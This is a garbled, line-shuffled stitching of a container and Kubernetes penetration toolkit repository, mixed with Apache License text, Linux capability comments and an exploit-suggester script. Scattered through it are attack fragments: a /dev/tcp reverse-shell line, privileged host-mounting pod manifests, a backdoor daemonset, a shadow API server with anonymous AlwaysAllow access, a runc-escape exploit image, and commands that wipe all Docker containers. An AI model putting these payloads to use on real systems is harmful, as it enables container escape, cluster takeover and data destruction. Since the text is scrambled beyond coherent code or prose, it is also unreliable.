    
        
         
            
                
                  
                    
                            
                                                                          
                                                         K8S.REMOTE_POD_PATH)
                                                   K8S.REMOTE_POD_PATH)
                                        SELFBUILD_K8S.REMOTE_POD_PATH)
                                 Apache License
                            RANK=$(($RANK 
                            {
                            }
                           shell=True)
                        ]
                        else
                        fi
                        http://www.apache.org/licenses/
                    fi
                    {
                    }
                10001
                ENABLE_PASSED_REQ=$(($ENABLE_PASSED_REQ 
                ]
                break
                fi
                noSysctl=1
                return 0
                return 1
                success = False
                {
                }
              - AUDIT_CONTROL
              - MKNOD
              - NET_ADMIN
              - SETFCAP
              - SYS_ADMIN
              - SYS_PTRACE
            - -c
            - /bin/sh
            - date
            AVAILABLE_PASSED_REQ=$(($AVAILABLE_PASSED_REQ 
            PASSED_REQ=$(($PASSED_REQ 
            TAGS_NUM=${
            ]
            add:
            args:
            break
            doVersionComparision $version $operator $KERNEL 
            doVersionComparision $version $operator $pkgVersion 
            done
            elif [ $retVal -eq 2 ]
            else
            exit 0
            fi
            if $KCONFIG 
            if [ $retVal -eq 0 ]
            if pattern in result.stdout 
            if pattern not in result.stdout 
            image: busybox
            imagePullPolicy: IfNotPresent
            opt_checksec_mode=true
            opt_cvelist_file=true
            opt_fetch_bins=true
            opt_fetch_srcs=true
            opt_full=true
            opt_kernel_only=true
            opt_kernel_version=true
            opt_pkglist_file=true
            opt_show_dos=true
            opt_skip_more_checks=true
            opt_skip_pkg_versions=true
            opt_summary=true
            opt_uname_string=true
            opt_userspace_only=true
            path: /
            retVal=$
            return 0
            return 1
            return 2
            scanner.Scan()
            shift
            usage 
            ver2[i]=0
            version
            {
            }
          - name: hello
          Derivative Works a copy of this License
          as modifying the License.
          as part of the Derivative Works
          capabilities:
          containers:
          do not modify the License. You may add Your own attribution
          excluding those notices that do not pertain to any part of
          include a readable copy of the attribution notices contained
          name: host-volume
          of the NOTICE file are for informational purposes only and
          of the following places: within a NOTICE text file distributed
          privileged: true
          restartPolicy: OnFailure
          stating that You changed the files
          that such additional attribution notices cannot be construed
          the Derivative Works
          wherever such third-party notices normally appear. The contents
        '
        '''.replace('
        '/root/.ssh/authorized_keys'
        'Alibaba Cloud Metadata API available'
        'CapEff:
        'cannot find kubernetes api host in ENV'
        ((j
        - CAP_AUDIT_CONTROL
        - CAP_AUDIT_READ
        - CAP_AUDIT_WRITE
        - CAP_BLOCK_SUSPEND
        - CAP_BPF
        - CAP_CHECKPOINT_RESTORE
        - CAP_CHOWN
        - CAP_DAC_OVERRIDE
        - CAP_DAC_READ_SEARCH
        - CAP_FOWNER
        - CAP_FSETID
        - CAP_IPC_LOCK
        - CAP_IPC_OWNER
        - CAP_KILL
        - CAP_LEASE
        - CAP_LINUX_IMMUTABLE
        - CAP_MAC_ADMIN
        - CAP_MAC_OVERRIDE
        - CAP_MKNOD
        - CAP_NET_ADMIN
        - CAP_NET_BIND_SERVICE
        - CAP_NET_BROADCAST
        - CAP_NET_RAW
        - CAP_PERFMON
        - CAP_SETFCAP
        - CAP_SETGID
        - CAP_SETPCAP
        - CAP_SETUID
        - CAP_SYSLOG
        - CAP_SYS_ADMIN
        - CAP_SYS_BOOT
        - CAP_SYS_CHROOT
        - CAP_SYS_MODULE
        - CAP_SYS_NICE
        - CAP_SYS_PACCT
        - CAP_SYS_PTRACE
        - CAP_SYS_RAWIO
        - CAP_SYS_RESOURCE
        - CAP_SYS_TIME
        - CAP_SYS_TTY_CONFIG
        - CAP_WAKE_ALARM
        - hostPath:
        - infinity
        - mountPath: /host-root
        - sleep
        --checksec)
        --cvelist-file)
        --kernelspace-only)
        --skip-more-checks)
        --skip-pkg-versions)
        --userspace-only)
        -V
        -b
        -d
        -f
        -g
        -h
        -k
        -p
        -s
        -u
        // cast hex address to uint32
        // format net.IP to dotted ipV4 string
        // get field containing gateway address
        // jump to line containing the agteway address
        // make net.IP address from uint32
        0) currentRelation='='
        1) currentRelation='>'
        2) currentRelation='<'
        ENABLE_REQS_NUM=${
        False
        PKG_LIST=$(/usr/bin/equery --quiet list '
        PKG_LIST=$(dpkg -l 
        PKG_LIST=$(pacman -Q 
        PKG_LIST=$(rpm -qa)
        UNAME_A=$(uname -a)
        ]
        add:
        black_list=black_list
        cmd
        cmd=r'auto-escape 
        cmd=r'run mount-cgroup 
        cmd=r'run mount-procfs /host_proc 
        cmd=r'run service-probe 192.168.1.1-
        cmd=r'run shim-pwn 
        cmd=r'ucurl get /var/run/docker.sock http://127.0.0.1/info 
        compareValues $curVal $val $sign 
        conn.run('chmod a
        connect_kwargs = {'key_filename': SELFBUILD_K8S.KEY_PATH}
        connect_kwargs = {'key_filename': SERVER.KEY_PATH}
        connect_kwargs = {'password': SELFBUILD_K8S.PASS}
        connect_kwargs = {'password': SERVER.PASS}
        continue
        curVal=$(/sbin/sysctl -a 2> /dev/null 
        d32 := uint32(d)
        declare -A EXPLOITS
        done
        echo
        elif [ $MODE -eq 4 ]
        elif echo $sysctlCondition 
        else
        exit(1)
        fi
        for i := 0
        for pattern in black_list:
        for pattern in white_list:
        i=$((i 
        if ((10
        if [ $cmdStdout -eq 0 ]
        if [[ -z ${ver2[i]} ]]
        if echo $sysctlCondition 
        if pattern in stdout 
        if pattern not in stdout 
        image: ${IMAGE}
        imagePullPolicy: IfNotPresent
        ip := net.IP(ipd32).String()
        k8s-app: ${K8S_APP}
        kcurl anonymous post 'https://172.21.0.1:443/api/v1/namespaces/default/pods
        mountPath: /host/dev
        mountPath: /host/etc
        mountPath: /host/proc
        mountPath: /host/sys
        mountPath: /host_root
        name: cdk-backdoor-pod
        name: runc-escape
        operator=${rest%$version}
        opt_skip_more_checks=true
        pass
        path: /
        path: /dev
        path: /etc
        path: /proc
        path: /sys
        print('errors while update cdk binary.')
        print('invoke UnexpectedExit')
        print('stderr
        print('stdout
        print(e)
        print(str(ret1.stderr.read()))
        print(str(ret1.stdout.read()))
        r'''
        resources: {}
        return
        return 0
        return result.stdout 
        securityContext:
        spec:
        state=$disabled
        state=$enabled
        then
        unset EXPLOITS
        ver1[i]=0
        verbose=False
        volumeMounts:
        {
        }
       http://www.apache.org/licenses/LICENSE-2.0
       to the current process' inheritable set
      (a) You must give any other recipients of the Work or
      (an example is provided in the Appendix below).
      (b) You must cause any modified files to carry prominent notices
      - command:
      - image: registry.cn-shanghai.aliyuncs.com/sandboxed-container/cve-2019-5736:change_root_pwd
      - name: KUBERNETES_SERVICE_HOST
      - name: KUBERNETES_SERVICE_PORT
      - name: dev
      - name: etc
      - name: net.ipv4.ip_local_port_range
      - name: net.ipv4.tcp_fin_timeout
      - name: proc
      - name: rootfs
      - name: sys
      Contribution(s) alone or by combination of their Contribution(s)
      PARTICULAR PURPOSE. You are solely responsible for determining the
      Work and such Derivative Works in Source or Object form.
      You may add Your own copyright statement to Your modifications and
      and conversions to other media types.
      and distribution as defined by Sections 1 through 9 of this document.
      any Contribution intentionally submitted for inclusion in the Work
      appropriateness of using or redistributing the Work and assume any
      as of the date such litigation is filed.
      by You to the Licensor shall be under the terms and conditions of
      by such Contributor that are necessarily infringed by their
      capabilities:
      comment syntax for the file format. We also recommend that a
      containers:
      copyright notice that is included in or attached to the work
      creationTimestamp: null
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      except as required for reasonable and customary use in describing the
      excluding communication that is conspicuously marked or otherwise
      exercising permissions granted by this License.
      file or class name and description of purpose be included on the
      granted to You under this License for that Work shall terminate
      has been advised of the possibility of such damages.
      hostNetwork: true
      hostPID: true
      hostPath:
      identification within third-party archives.
      image: centos:latest
      institute patent litigation against any entity (including a
      k8s-app: ${K8S_APP}
      labels:
      may provide additional or different license terms and conditions
      meet the following conditions:
      name: host-volume
      name: test-volume
      of your accepting any such warranty or additional liability.
      on behalf of whom a Contribution has been received by Licensor and
      or a Contribution incorporated within the Work constitutes direct
      or by an individual or Legal Entity authorized to submit on behalf of
      or other liability obligations and/or rights consistent with this
      origin of the Work and reproducing the content of the NOTICE file.
      path: /
      path: /tmp
      privileged: true
      replaced with your own identifying information. (Don't include
      restartPolicy: Always
      restartPolicy: Never
      result of this License or out of the use or inability to use the
      risks associated with Your exercise of permissions under this License.
      runAsUser: 0
      submitted to Licensor for inclusion in the Work by the copyright owner
      subsequently incorporated within the Work.
      template:
      the Work and Derivative Works thereof.
      the brackets!)  The text should be enclosed in the appropriate
      the conditions stated in this License.
      the copyright owner that is granting the License.
      the original version of the Work and any modifications or additions
      the terms of any separate license agreement you may have executed
      unless required by applicable law (such as deliberate and grossly
      volumes:
      where such license applies only to those patent claims licensable
      with Licensor regarding such Contributions.
      with the Work to which such Contribution(s) was submitted. If You
      {
      }
     black_list = black_list
    )
    - --allow-privileged=true
    - --anonymous-auth=true
    - --authorization-mode=AlwaysAllow
    - --client-ca-file=/etc/kubernetes/pki/ca.crt
    - --enable-bootstrap-token-auth=true
    - --etcd-cafile=/etc/kubernetes/pki/etcd/ca.crt
    - kube-apiserver
    - mountPath: /host-root
    - mountPath: /mnt
    - name: centos-container
    - name: dev
    - name: etc
    - name: proc
    - name: rootfs
    - name: sys
    APIVersion string            
    AVAILABLE_PASSED_REQ=0
    AVAILABLE_REQS_NUM=${
    BIN_PATH = '/Users/xy/go/CDK/cmd/cdk/cdk'
    BUILD_CMD = 'cd {} 
    BUILD_PATH = '/Users/xy/go/CDK/cmd/cdk'
    ContainerPort int 
    Containers []K8sContainer 
    ENABLE_PASSED_REQ=0
    ENABLE_REQS_NUM=0
    GO_BINARY = '/Users/xy/go/go1.16beta1/bin/go'
    HOST = '118.195.140.100'
    Image string              
    KEY_PATH = '/Users/xy/.ssh/id_rsa'
    KUBECTL_PATH = '/Users/xy/Desktop/lezhen-test-case/k8s/kubectl'
    KUBERNETES_SERVICE_HOST = '172.16.252.1'
    KUBERNETES_SERVICE_PORT = '443'
    KUBE_CONFIG = '/Users/xy/.kube/cdk.config'
    Kind       string            
    Labels    map[string]string 
    MODE=0
    Metadata   K8sObjectMeta     
    Name      string            
    Name  string              
    Namespace string            
    PASS = ''
    PASSED_REQ=0
    Ports []K8sContainerPort  
    RANK=$1
    REMOTE_CONTAINER_PATH = '/cdk-fabric'
    REMOTE_HOST_PATH = '/root/cdk-fabric'
    REMOTE_POD_PATH = '/cdk-fabric'
    REQS_NUM=${
    Spec       K8sPodSpec        
    TARGET_POD = 'myappnew'
    USER = 'root'
    ]
    black_list = []
    case $
    check_host_exec(
    check_host_exec(r'docker stop $(docker ps -q) 
    check_pod_exec(
    check_selfbuild_k8s_pod_exec(
    checksecMode
    cmd_parsed = r'kubectl exec {} -- {} {}'.format(
    component: shadow-kube-apiserver
    curVal=$1
    declare -A EXPLOITS
    declare -A EXPLOITS_USERSPACE
    defer file.Close()
    do
    done
    echo
    elif [ $AVAILABLE_PASSED_REQ -eq $AVAILABLE_REQS_NUM -a $ENABLE_PASSED_REQ -eq $ENABLE_REQS_NUM ]
    elif [ -f /boot/config-
    elif [ -x /usr/bin/equery ]
    else
    else:
    env:
    esac
    except Exception as e:
    except UnexpectedExit as e:
    exit 0
    exit 1
    fi
    field = 2    // field containing hex gateway address (first field: 0)
    for ((i=${
    for ((i=0
    for pattern in black_list:
    for pattern in white_list:
    for scanner.Scan() {
    fsGroup: 10001
    getKernelConfig
    gox_release()
    http://www.apache.org/licenses/LICENSE-2.0
    i=0
    if K8S.REMOTE_POD_PATH in str(ret1.stdout.read()):
    if SELFBUILD_K8S.PASS:
    if SELFBUILD_K8S.REMOTE_POD_PATH in str(resp):
    if SERVER.PASS:
    if [ $PASSED_REQ -eq $REQS_NUM ]
    if [ -f /proc/config.gz ] 
    if [[ $1 == $2 ]]
    if err != nil {
    if verbose:
    inside_container_cmd(
    int 
    k8s-app: ${K8S_APP}
    k8s_master_ssh_cmd(
    k8s_pod_upload()
    line  = 1    // line containing the gateway addr. (first line: 0)
    local IFS=.
    local distro=$1
    local i ver1=($1) ver2=($2)
    local pkglist_file=$2
    local uname=$1
    matchLabels:
    metadata:
    name: container
    name: host-volume
    name: my-serviceaccount
    name: test-volume
    name: ubuntu
    namespace: default
    noSysctl=0
    opt_skip_more_checks=false
    opt_skip_more_checks=true
    os.system(CDK.BUILD_CMD)
    os.system(cmd)
    print('-' 
    print('[ERROR] {} while running cmd: {}
    print('[upload to host]')
    print('[upload] CDK binary to K8s pod:{}'.format(K8S.TARGET_POD))
    print('[upload] CDK binary to self-build k8s master node')
    print('done')
    print(msg.format(result))
    return 0
    return 1
    runAsGroup: 3000
    runAsUser: 1000
    scanner := bufio.NewScanner(file)
    securityContext:
    selfbuild_k8s_pod_upload()
    shift
    sign=$3
    spec:
    state=$unknown
    stderr = str(ret.stderr.read())
    stdout = str(ret.stdout.read())
    success = True
    supplementalGroups: [ 10001]
    sysctls:
    test_dev()
    then
    tier: control-plane
    time.sleep(0.5)
    time.sleep(1)
    try:
    unset EXPLOITS
    unset EXPLOITS_USERSPACE
    update_remote_bin()
    val=$2
    verComparision $currentVersion $reqVersion
    volumeMounts:
    while read -r line
    white_list = [
    }
   - And potentially other features
   - BPF to BPF function calls
   - Bounded loops
   - Dead code elimination
   - Indirect variable access
   - Larger complexity limits
   - Scalar precision tracking
   1. Definitions.
   2. Grant of Copyright License. Subject to the terms and conditions of
   3. Grant of Patent License. Subject to the terms and conditions of
   4. Redistribution. You may reproduce and distribute copies of the
   6. Trademarks. This License does not grant permission to use the trade
   7. Disclaimer of Warranty. Unless required by applicable law or
   9. Accepting Warranty or Additional Liability. While redistributing
   APPENDIX: How to apply the Apache License to your work.
   Add any capability from current's capability bounding set
   Allow modification of the securebits for a process
   Allow taking bits out of capability bounding set
   CAP_LINUX_IMMUTABLE. 
   Copyright [yyyy] [name of copyright owner]
   END OF TERMS AND CONDITIONS
   See the License for the specific language governing permissions and
   The base kernel enforces no MAC policy.
   The base kernel requires no MAC configuration.
   UID) processes 
   You may obtain a copy of the License at
   [_POSIX_ACL] is defined. Excluding DAC access covered by
   and shared memory 
   arbitrary SCSI commands 
   bits on that file
   capability it should use to do so. 
   cleared on successful return from chown(2) (not implemented). 
   defined. Excluding DAC access covered by CAP_LINUX_IMMUTABLE. 
   extra ioctls) 
   is applicable. It doesn't override MAC and DAC restrictions. 
   limitations under the License.
   of the process receiving the signal. 
   overrides the restriction of changing file ownership and group
   ownership. 
   process sending a signal must match the real or effective user ID
   process. 
   processes and setting the scheduling algorithm used by another
   remove any capability in your permitted set from any pid
   resources) 
   shall match the file owner ID when setting the S_ISUID and S_ISGID
   sockets 
   supplementary group IDs) shall match the file owner ID when setting
   the S_ISGID bit on that file
   the capability it should use to do so. 
   to implement capability based checks on modifications to that
   with IPC) 
   you can override using fsuid too 
   you may not use this file except in compliance with the License.
  - command:
  - hostPath:
  - image: nginx
  - image: ubuntu
  - kind: ServiceAccount
  - name: nearcontainer
  -h --help     Show this help msg.
  -v --version  Show version.
  ./cdk ectl <endpoint> get <key>
  ./cdk ectl http://172.16.5.4:2379 get /
  ./cdk kcurl (<token_path>
  ./cdk kcurl /var/run/secrets/kubernetes.io/serviceaccount/token get 'https://192.168.0.234:6443/api/v1/nodes'
  ./cdk kcurl default get 'https://192.168.0.234:6443/api/v1/nodes'
  anonymous   connect api-server using system:anonymous service-account.
  apiGroup: rbac.authorization.k8s.io
  automountServiceAccountToken: true
  cdk <tool> [<args>...]
  cdk auto-escape <cmd>
  cdk auto-escape <cmd>                     Escape container in different ways then let target execute <cmd>.
  cdk eva [--full]
  cdk evaluate                              Gather information to find weakness inside container.
  cdk evaluate --full                       Enable file scan during information gathering.
  cdk evaluate [--full]
  cdk run (--list 
  cdk run --list                            List all available exploits.
  containers:
  creationTimestamp: null
  default     connect api-server using pod default service-account token.
  ectl <endpoint> get <key>                 Unauthorized enumeration of ectd keys.
  hostIPC: true
  hostNetwork: true
  hostPID: true
  ifconfig                                  Show network information.
  jobTemplate:
  kcurl <path> (get
  kind: ClusterRole
  labels:
  name: cdk-backdoor-daemonset
  name: cdk-fuzz-psp
  name: cdk-rbac-bypass-create-pod
  name: cdk-shadow-apiserver-webhook-control-plane
  name: cdxy-admin-binding
  name: cdxy-default-to-admin-binding
  name: cluster-admin
  name: default
  name: hello
  name: my-centos-pod
  name: my-cluster-admin
  name: my-serviceaccount
  name: myappnew
  name: runc-escape
  name: system:anonymous
  namespace: default
  namespace: kube-system
  nc [options]                              Create TCP tunnel.
  securityContext:
  selector:
  serviceAccountName: admin
  serviceAccountName: my-serviceaccount
  template:
  token_path  connect api-server with user-specified service-account token.
  ucurl (get
  volumes:
 != 0 ] 
 !exists {
 !no_cap_dac_read_search
 !no_containerd_shim_pwn
 !no_containerd_shim_pwn 
 !no_k8s_shadow_apiserver
 !no_k8s_shadow_apiserver 
 !ok {
 $tags 
 'uname -a' output doesn't contain distribution number (at least not in case of all distros)
 ('-r' is used to not interpret backslash used for bash colors)
 ((ret1 
 ((ret2 
 (ret2 
 - --insecure-bind-address=0.0.0.0
 - --insecure-port=443
 - Advanced verifier features
 - BPF progs can use of pointer-to-integer conversions
 - Creating all types of BPF maps
 - Loading BPF Type Format (BTF) data
 - Retrieve xlated and JITed code of BPF programs
 - Use bpf_spin_lock() helper
 - bpf_probe_read to read arbitrary kernel memory is allowed
 - bpf_trace_printk to print kernel memory is allowed
 - speculation attack hardening measures are bypassed
 ----
 ---- 
 --checksec mode is standalone mode and is not applicable when one of -k 
 --checksec set
 --checksec switches are set
 --cvelist-file 
 --cvelist-file mode is standalone mode and is not applicable when one of -k 
 --cvelist-file switches are set
 --kernel 
 --pkglist-file NOT provided: take all info from current machine
 --pkglist-file provided: only consider userspace exploits against provided package listing
 --userspace-only filter options
 -f /lib/udev/rules.d/95-udev-late.rules ]]
 -p 
 -u 
 ../../cdk_release_binary/
 /dev/tcp/%s/%s 0>
 0x1
 0xff) 
 0xfff) << 32) 
 0xfff) << 8) 
 0xfffff00) << 12))
 1))
 1.1 exploit privileged container with mount device
 1.2 exploit privileged container with cgroup
 10)
 1000)
 1024
 14.04: <1.4.6
 16.04: 1.10.0
 2))
 2):
 2. shim-pwn
 3))
 3. docker.sock
 3rdparty-feature (3) 
 404StarLink 2.0 - Galaxy
 <exploit> [<args>...])
 Abuse Unprivileged User Namespace Escaping  CVE-2022-0492  
 Access Key Scanning                                        
 Adam 'pi3' Zabrocki
 Additional Contributors and Thanks
 Allow DDI debug ioctl on sbpcd driver 
 Allow MAC configuration or state changes.
 Allow PID selection during clone3() 
 Allow VM86_REQUEST_IRQ 
 Allow access to the nvram device 
 Allow activation of ATM control sockets 
 Allow administration of the random device 
 Allow binding to any address for transparent proxying (also via NET_ADMIN) 
 Allow binding to any address for transparent proxying (also via NET_RAW) 
 Allow calling bdflush() 
 Allow checkpoint/restore related operations 
 Allow clearing driver statistics 
 Allow configuration of audit via unicast netlink socket 
 Allow configuration of process accounting 
 Allow configuration of the secure attention key 
 Allow configuration of tty devices 
 Allow configuring the kernel's syslog (printk behaviour) 
 Allow enabling/disabling tagged queuing on SCSI controllers and sending
 Allow everything under CAP_BPF and CAP_PERFMON for backward compatibility 
 Allow examination and configuration of disk quotas 
 Allow flushing all cache on m68k (sys_cacheflush) 
 Allow forged pids on socket credentials passing 
 Allow interface configuration 
 Allow ioperm/iopl access 
 Allow irix_prctl on mips (setstacksize) 
 Allow irix_stime on mips 
 Allow locking of shared memory segments 
 Allow locking/unlocking of shared memory segment 
 Allow manipulation of system clock 
 Allow manufacturer commands in isdn CAPI support driver 
 Allow mlock and mlockall (which doesn't really have anything to do
 Allow modification of S_IMMUTABLE and S_APPEND file attributes 
 Allow modification of routing tables 
 Allow more than 64hz interrupts from the real-time clock 
 Allow multicasting 
 Allow nfsservctl 
 Allow preventing system suspends 
 Allow ptrace() of any process 
 Allow raising priority and setting priority on other (different
 Allow read/write of device-specific registers 
 Allow reading non-standardized portions of pci configuration space 
 Allow reading the audit log via multicast netlink socket 
 Allow removing semaphores 
 Allow sending USB messages to any device via /dev/bus/usb 
 Allow sending raw qic-117 commands 
 Allow setting TOS (type of service) 
 Allow setting arbitrary process / process group ownership on
 Allow setting cpu affinity on other processes 
 Allow setting debug option on sockets 
 Allow setting encryption key on loopback filesystem 
 Allow setting geometry in floppy driver 
 Allow setting ioprio class on other processes 
 Allow setting promiscuous mode 
 Allow setting readahead and flushing buffers on block devices 
 Allow setting realtime ioprio class 
 Allow setting the domainname 
 Allow setting the hostname 
 Allow setting the real-time clock 
 Allow setting up serial ports 
 Allow setting zone reclaim policy 
 Allow some autofs root ioctls 
 Allow system performance and observability privileged operations
 Allow taking of leases on files 
 Allow the privileged aspects of mknod() 
 Allow to read/write pci config on alpha 
 Allow triggering something that will wake the system 
 Allow tuning the ide driver 
 Allow turning DMA on/off in xd driver 
 Allow turning swap on/off 
 Allow use of FIFO and round-robin (realtime) scheduling on own
 Allow use of PACKET sockets 
 Allow use of RAW sockets 
 Allow use of chroot() 
 Allow use of reboot() 
 Allow vhangup() of tty 
 Allow writing the audit log via unicast netlink socket 
 Allow writing to ns_last_pid 
 Allows binding to ATM VCIs below 32 
 Allows binding to TCP/UDP sockets below 1024 
 Allows forged gids on socket credentials passing. 
 Allows forged pids on socket credentials passing. 
 Allows set
 Allows setgid(2) manipulation 
 Allows setgroups(2) 
 BASE CDK
 BlackHat Asia 2021 Arsenal
 Brendan Coles (author of exploit update at 'ext-url')
 Bug Reporting
 CAP_BPF allows the following BPF operations:
 CAP_NET_ADMIN and CAP_BPF are required to load networking programs.
 CAP_PERFMON and CAP_BPF are required to load tracing programs.
 CAP_PERFMON relaxes the verifier checks further:
 CAP_SYS_ADMIN is required to iterate system wide loaded
 CAP_SYS_ADMIN is required to use bpf_probe_write_user.
 CDK - Zero Dependency Container Penetration Toolkit
 CDK Exploit Name       
 CDK-Deploy-Test
 CONFIG_XFRM needs to be enabled
 Cgroups Escaping                                           
 Contributing to CDK
 Control memory reclaim behavior 
 Credential Access    
 DISTRO=$(grep -s -E '
 Deploy Backdoor Pod                                        
 Deploy K8s CronJob                                         
 Deploy Shadow K8s api-server                               
 Deploy WebShell                                            
 Developer Docs
 Device Mount Escaping                                      
 Discovery            
 Doc                                                                                  
 Docker API(2375) RCE                                       
 Dump Istio Sidecar Meta                                    
 Dump K8s Config                                            
 Dump K8s Pod Security Policies                             
 Dump K8s Secrets                                           
 EVALUATE
 EXPLOIT
 Escaping             
 Etcd Get K8s Token                                         
 Evaluate Module
 Events
 Explain why this enhancement would be useful to other users.
 Exploit Module
 Features
 Gabriele Bonacini (author of exploit at 'ext-url')
 GreenBold.Sprint(title) 
 HITB SecConf 2021 Amsterdam
 ID 
 In Thin                                                                    
 Insert and remove kernel modules - modify kernel without limit 
 Installation/Delivery
 K8s Component Probe                                        
 K8s MITM Attack (CVE-2020-8554)                            
 K8s RBAC Bypass                                            
 KCON 2021 Arsenal
 KUBE_CONFIG = '/Users/xy/.kube/config'
 Kubelet Exec                                               
 Kubernetes community Days 2021 
 LINUX KERNELSPACE EXPLOITS 
 LXCFS Escaping                                             
 Legal Disclaimer
 Link
 Linux-specific capabilities
 Master node SSH
 Modify data journaling mode on ext3 filesystem (uses journaling
 Override IPC ownership checks 
 Override MAC access.
 Override max number of consoles on console allocation 
 Override max number of keymaps 
 Override quota limits. 
 Override reserved space on ext2 filesystem 
 Override resource limits. Set resource limits. 
 Override size restrictions on IPC message queues 
 Overrides all DAC restrictions regarding read and search on files
 Overrides the following restrictions that the effective user ID
 Overrides the restriction that the real or effective user ID of a
 Overview
 POSIX-draft defined capabilities.
 PRIVATE
 PUBLIC
 Persistence          
 Please enable a sustainable environment for us to review contributions.
 Privilege Escalation 
 Procfs Escaping                                            
 Ptrace Escaping PoC                                        
 Pull Requests
 Quick Start
 RANK=$(($RANK 
 Read arbitrary file from host system (CAP_DAC_READ_SEARCH) 
 Refer to the code https://github.com/torvalds/linux/blob/master/include/uapi/linux/capability.h by torvalds.
 Registry BruteForce                                        
 Release Document
 Remote Control       
 Reverse Shell                                              
 Rewrite Cgroup(devices.allow)                              
 Running screenshots or logs before and after you fix the problem.
 Screenshots about how this new feature works.
 Set or remove capabilities on files 
 Suggesting Enhancements
 Supported 
 TIPS: Deliver CDK into target container in real-world penetration testing
 TODO: add kernel version number validation
 TOOL
 Tactic               
 Technique                                                  
 The 
 Tool Module
 USERSPACE EXPLOITS 
 Usage
 WHC 2021 (
 Without VFS support for capabilities:
 [0-9]
 [404tk](https://github.com/404tk) 
 [kingkaki](https://github.com/kingkaki) 
 [lazydog](https://github.com/yeahx) 
 [link](https://github.com/cdk-team/CDK/wiki/Evaluate:-k8s-mitm-clusterip)            
 [link](https://github.com/cdk-team/CDK/wiki/Exploit:-Container-Image-Registry-Brute) 
 [link](https://github.com/cdk-team/CDK/wiki/Exploit:-abuse-unpriv-userns)            
 [link](https://github.com/cdk-team/CDK/wiki/Exploit:-ak-leakage)                     
 [link](https://github.com/cdk-team/CDK/wiki/Exploit:-cap-dac-read-search)            
 [link](https://github.com/cdk-team/CDK/wiki/Exploit:-check-istio)                    
 [link](https://github.com/cdk-team/CDK/wiki/Exploit:-check-ptrace)                   
 [link](https://github.com/cdk-team/CDK/wiki/Exploit:-docker-api-pwn)                 
 [link](https://github.com/cdk-team/CDK/wiki/Exploit:-docker-sock-check)              
 [link](https://github.com/cdk-team/CDK/wiki/Exploit:-docker-sock-pwn)                
 [link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-backdoor-daemonset)         
 [link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-configmap-dump)             
 [link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-cronjob)                    
 [link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-get-sa-token)               
 [link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-psp-dump)         
 [link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-secret-dump)                
 [link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-shadow-apiserver) 
 [link](https://github.com/cdk-team/CDK/wiki/Exploit:-lxcfs-rw)                       
 [link](https://github.com/cdk-team/CDK/wiki/Exploit:-mount-cgroup)                   
 [link](https://github.com/cdk-team/CDK/wiki/Exploit:-mount-disk)                     
 [link](https://github.com/cdk-team/CDK/wiki/Exploit:-mount-procfs)                   
 [link](https://github.com/cdk-team/CDK/wiki/Exploit:-reverse-shell)                  
 [link](https://github.com/cdk-team/CDK/wiki/Exploit:-rewrite-cgroup-devices)         
 [link](https://github.com/cdk-team/CDK/wiki/Exploit:-service-probe)                  
 [link](https://github.com/cdk-team/CDK/wiki/Exploit:-shim-pwn)             
 [link](https://github.com/cdk-team/CDK/wiki/Exploit:-webshell-deploy)                
 [run test in container.](https://github.com/cdk-team/CDK/wiki/Run-Test)
 [wywwzjj](https://github.com/wywwzjj) 
 abuse-unpriv-userns    
 additional checks are not applicable for this mode
 additional requirement for --cvelist-file mode: check if CVE associated with the exploit is on the CVELIST_FILE
 advance to next MODE
 ak-leakage             
 always true for Linux OS
 and
 and 
 anonymousLogin
 ans)
 api)
 append current tag to tags list
 apt install -y netcat
 attack-surface (4)
 awk '{print 
 awk '{print $(NF-1)}')
 awk '{print $2}')
 awk '{print $3}' 
 awk '{print $3}')
 awk -F'=' '{print $2}')
 awk -F'Name:' '{print $1}')
 awk -F'ed: ' '{print $2}')
 b == 0 {
 bash colors
 bcoles (author of exploit update at 'ext-url')
 below:
 binary after build
 body)
 build
 build command
 bump RANK slightly (
 bump current exploit's rank additionally by 3 for kernel version regex match
 bump current exploit's rank by 2 for distro match (and not in '--uname' mode)
 by yourself.
 cap-dac-read-search    
 case 1: --kernel set
 case 2: --uname set
 case 3: --cvelist-file mode
 case 4: --checksec mode
 case 5: no --uname 
 case for vanilla execution: ./linux-exploit-suggester.sh
 cat /run/secrets/kubernetes.io/serviceaccount/token 
 check Bash version (associative arrays need Bash in version 4.0
 check if upload success
 check whether it is met
 check-ptrace           
 clear the crontab
 clear_all_env()
 cmd)
 command
 compare 
 config is not available
 container-based evaluate
 containerID 
 containerd-shim CVE-2020-15257                             
 continue
 convert entry back to canonical form
 cover crontab with backup file
 cp cdk from master node to target pod via (kubectl in master node).
 create array from current exploit here doc and fetch needed lines
 curl shadow-apiserver
 cut -d '-' -f 1)
 cut -d ']' -f1 
 cut -d 'm' -f2 
 cut -d' ' -f 2)
 cut -d' ' -f 2- 
 cut -d' ' -f 2-)
 cut -d':' -f 1)
 cut -d':' -f 2)
 cut -d':' -f2 
 cut -d'=' -f1)
 cut -d'=' -f2 
 cut -d'=' -f2)
 cut -d'{' -f 2 
 cut -d/ -f2- 
 detect if it's 'rpm -qa' listing or 'dpkg -l' or 'pacman -Q' listing of not recognized listing
 display result (short)
 display result (standard)
 display sorted exploits
 do not consider current OS
 do not perform additional checks on current machine
 do sleep 30
 docker rm $(docker ps -aq)
 docker-api-pwn         
 docker-runc CVE-2019-5736                                  
 docker-sock-check      
 docker-sock-pwn        
 docker.sock PoC (DIND attack)                              
 docker.sock RCE                                            
 done
 e.Error())
 echo Hello from the Kubernetes cluster
 err 
 err != nil {
 err == io.EOF {
 errStr
 error: %s
 etcd-get-k8s-token     
 evaluate in K8s
 execute for exploits with all requirements met
 exit if both --full and --short are set
 exit if both --kernel and --uname are set
 exploit name without CVE number and without commonly used special chars
 exploit: --list
 exploit: ak-leakage
 exploit: docker-sock-check
 exploit: docker-sock-check (will leave a container with image alpine:latest)
 exploit: docker-sock-pwn
 exploit: k8s-configmap-dump
 exploit: k8s-secret-dump
 exploit: mount-disk
 exploit: mount-procfs
 exploit: reverse-shell
 exploit: service-probe
 exploit: shim-pwn
 exploit: webshell-deploy
 exploits database
 export host_path=
 extract distribution version from /etc/os-release OR /etc/lsb-release
 extract package listing from current OS
 extract package version and check if requiremnt is true
